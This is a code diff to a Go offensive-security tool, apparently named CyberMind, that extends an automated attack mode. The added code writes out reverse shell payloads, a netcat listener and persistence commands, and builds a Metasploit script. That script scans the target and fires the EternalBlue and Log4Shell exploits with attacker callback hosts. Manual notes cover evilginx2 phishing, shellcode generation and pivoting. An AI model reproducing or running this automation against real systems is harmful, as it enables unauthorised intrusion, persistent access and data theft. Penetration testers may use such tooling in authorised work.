@@ -280,6 +280,44 @@ func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []E
 	var results []ExploitResult
 	findings := make(map[string]string)
 
+	// ── Generate reverse shell commands upfront ───────────────────────────
+	// These are real working commands — save to session dir for user reference
+	if ctx.LHOST != "" {
+		shells := GenerateReverseShell(ctx.LHOST, "4444")
+		var shellGuide strings.Builder
+		shellGuide.WriteString("# CyberMind Reverse Shell Guide\n")
+		shellGuide.WriteString(fmt.Sprintf("# Target: %s | LHOST: %s | LPORT: 4444\n\n", ctx.Target, ctx.LHOST))
+		shellGuide.WriteString("## Start listener FIRST:\n")
+		shellGuide.WriteString(fmt.Sprintf("nc -lvnp 4444\n\n"))
+		shellGuide.WriteString("## Reverse shell payloads (use after RCE confirmed):\n")
+		for name, cmd := range shells {
+			shellGuide.WriteString(fmt.Sprintf("### %s:\n%s\n\n", name, cmd))
+		}
+		persistence := GeneratePersistenceCommands(ctx.LHOST, "4444")
+		shellGuide.WriteString("## Persistence (after shell obtained):\n")
+		for name, cmd := range persistence {
+			shellGuide.WriteString(fmt.Sprintf("### %s:\n%s\n\n", name, cmd))
+		}
+		shellGuidePath := ctx.SessionDir + "/shell_guide.md"
+		os.WriteFile(shellGuidePath, []byte(shellGuide.String()), 0600)
+		progress(AbhimanyuStatus{
+			Tool:   "shell-guide",
+			Kind:   StatusDone,
+			Reason: fmt.Sprintf("Shell guide saved: %s", shellGuidePath),
+		})
+	}
+
+	// ── Generate Metasploit resource script ──────────────────────────────
+	// This is a real .rc file that msfconsole can execute
+	rcPath := generateMSFResourceScript(ctx)
+	if rcPath != "" {
+		progress(AbhimanyuStatus{
+			Tool:   "msf-resource",
+			Kind:   StatusDone,
+			Reason: fmt.Sprintf("MSF resource script: msfconsole -r %s", rcPath),
+		})
+	}
+
 	for phase := 1; phase <= 6; phase++ {
 		// Skip post-exploit/lateral/exfil phases for web targets without shell
 		if skipPostExploit && phase >= 4 {
@@ -295,10 +333,33 @@ func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []E
 			continue
 		}
 
+		// Skip evilginx2 — requires domain + SSL certificate (cannot be automated)
+		// Skip donut — requires a pre-built payload file
+		// These are documented in shell_guide.md for manual use
+
 		for _, spec := range tools {
 			if spec.Phase != phase {
 				continue
 			}
+
+			// Tools that require manual setup — skip auto-run, document instead
+			manualOnlyTools := map[string]string{
+				"evilginx2": "Requires domain + SSL cert. Manual setup: evilginx2 -developer -p /usr/share/evilginx/phishlets/",
+				"donut":     "Requires pre-built payload. Manual: donut -f payload.exe -o shellcode.bin",
+				"ligolo-ng": "Requires agent on target. Manual: ligolo-ng -selfcert -laddr 0.0.0.0:11601",
+			}
+			if reason, isManual := manualOnlyTools[spec.Name]; isManual {
+				progress(AbhimanyuStatus{
+					Tool:   spec.Name,
+					Kind:   StatusSkipped,
+					Reason: reason,
+				})
+				// Save manual instructions to session dir
+				manualPath := ctx.SessionDir + "/manual_" + spec.Name + ".txt"
+				os.WriteFile(manualPath, []byte(reason+"\n"), 0600)
+				continue
+			}
+
 			if !isAvailable(spec.Name) {
 				progress(AbhimanyuStatus{
 					Tool:   spec.Name,
@@ -326,8 +387,13 @@ func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []E
 					progress(AbhimanyuStatus{
 						Tool:   spec.Name,
 						Kind:   StatusDone,
-						Reason: fmt.Sprintf("SHELL OBTAINED: %s", ctx.ShellType),
+						Reason: fmt.Sprintf("SHELL OBTAINED: %s — post-exploit phases unlocked", ctx.ShellType),
 					})
+					// Save shell info
+					shellInfo := fmt.Sprintf("Shell obtained via %s\nType: %s\nTarget: %s\nTime: %s\n\nOutput snippet:\n%s",
+						spec.Name, ctx.ShellType, ctx.Target, time.Now().Format(time.RFC3339),
+						result.Output[:min(500, len(result.Output))])
+					os.WriteFile(ctx.SessionDir+"/shell_obtained.txt", []byte(shellInfo), 0600)
 				}
 
 				saveSession(ctx, findings)
@@ -337,7 +403,114 @@ func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []E
 
 	// Final session save
 	saveSession(ctx, findings)
+
+	// Print session summary
+	progress(AbhimanyuStatus{
+		Tool:   "session",
+		Kind:   StatusDone,
+		Reason: fmt.Sprintf("Session saved: %s | Shell: %v | Vulns: %d", ctx.SessionDir, ctx.ShellObtained, len(ctx.VulnsFound)),
+	})
+
 	return results
+}
+
+// generateMSFResourceScript creates a real Metasploit resource script (.rc file)
+// that can be run with: msfconsole -r /path/to/script.rc
+// This is genuinely useful — msfconsole -r is the real way to automate MSF.
+func generateMSFResourceScript(ctx *AbhimanyuContext) string {
+	if ctx.SessionDir == "" {
+		return ""
+	}
+
+	var rc strings.Builder
+	rc.WriteString("# CyberMind Metasploit Resource Script\n")
+	rc.WriteString(fmt.Sprintf("# Target: %s | Generated: %s\n\n", ctx.Target, time.Now().Format(time.RFC3339)))
+
+	// Setup workspace
+	rc.WriteString(fmt.Sprintf("workspace -a cybermind_%s\n", sanitizeTarget(ctx.Target)))
+
+	// Port scan via db_nmap
+	portList := portListOrDefault(ctx.OpenPorts, "22,80,443,445,3389,8080,8443")
+	rc.WriteString(fmt.Sprintf("db_nmap -sV -sC -T4 -p %s %s\n", portList, ctx.Target))
+	rc.WriteString("vulns\n")
+	rc.WriteString("services\n\n")
+
+	// Tech-specific modules
+	techStr := strings.ToLower(strings.Join(ctx.Technologies, " "))
+
+	if strings.Contains(techStr, "smb") || containsPort(ctx.OpenPorts, 445) {
+		rc.WriteString("# SMB enumeration\n")
+		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/smb/smb_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
+		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS %s\nrun\n\n", ctx.Target))
+	}
+
+	if containsPort(ctx.OpenPorts, 22) {
+		rc.WriteString("# SSH enumeration\n")
+		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/ssh/ssh_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
+	}
+
+	if containsPort(ctx.OpenPorts, 3306) {
+		rc.WriteString("# MySQL enumeration\n")
+		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/mysql/mysql_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
+	}
+
+	if containsPort(ctx.OpenPorts, 6379) {
+		rc.WriteString("# Redis — unauthenticated access check\n")
+		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/redis/redis_server\nset RHOSTS %s\nrun\n\n", ctx.Target))
+	}
+
+	if containsPort(ctx.OpenPorts, 27017) {
+		rc.WriteString("# MongoDB — unauthenticated access check\n")
+		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS %s\nrun\n\n", ctx.Target))
+	}
+
+	// CVE-based modules from vulns found
+	for _, vuln := range ctx.VulnsFound {
+		lower := strings.ToLower(vuln)
+		if strings.Contains(lower, "ms17-010") || strings.Contains(lower, "eternalblue") {
+			rc.WriteString("# EternalBlue (MS17-010)\n")
+			rc.WriteString(fmt.Sprintf("use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS %s\n", ctx.Target))
+			if ctx.LHOST != "" {
+				rc.WriteString(fmt.Sprintf("set LHOST %s\n", ctx.LHOST))
+			}
+			rc.WriteString("run\n\n")
+		}
+		if strings.Contains(lower, "log4shell") || strings.Contains(lower, "cve-2021-44228") {
+			rc.WriteString("# Log4Shell (CVE-2021-44228)\n")
+			rc.WriteString(fmt.Sprintf("use exploit/multi/misc/log4shell_header_injection\nset RHOSTS %s\n", ctx.Target))
+			if ctx.LHOST != "" {
+				rc.WriteString(fmt.Sprintf("set LHOST %s\n", ctx.LHOST))
+			}
+			rc.WriteString("run\n\n")
+		}
+	}
+
+	rc.WriteString("# Show all findings\nvulns\ncreds\nloot\n")
+	rc.WriteString("exit\n")
+
+	rcPath := ctx.SessionDir + "/cybermind_msf.rc"
+	if err := os.WriteFile(rcPath, []byte(rc.String()), 0600); err != nil {
+		return ""
+	}
+	return rcPath
+}
+
+// containsPort checks if a port is in the list
+func containsPort(ports []int, port int) bool {
+	for _, p := range ports {
+		if p == port {
+			return true
+		}
+	}
+	return false
+}
+
+// min returns the smaller of two ints
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
 
 // updateAbhimanyuContext extracts intelligence from tool output in real-time.
